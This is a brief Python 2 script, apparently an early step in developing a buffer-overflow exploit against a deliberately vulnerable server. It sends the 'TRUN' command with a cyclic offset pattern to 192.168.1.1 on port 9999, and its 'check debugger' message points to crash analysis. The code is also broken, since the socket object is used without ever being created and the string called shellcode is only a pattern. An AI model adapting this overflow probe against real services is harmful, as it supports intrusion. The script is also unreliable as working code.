#!/usr/bin/python
import socket
import sys

shellcode= "Aa0Aa0Aa1Aa1Aa2Aa2Aa3Aa3Aa4Aa4Aa5Aa5Aa6Aa6Aa7Aa7Aa8Aa8Aa9Aa9Ab0Ab0Ab1Ab1Ab2Ab2Ab3Ab3Ab4Ab4Ab5Ab5Ab6A"

try:
	connect=s.connect(('192.168.1.1',9999))
	s.send(('TRUN /.:/' + shellcode))
except:
	print"check debugger"
s.close()

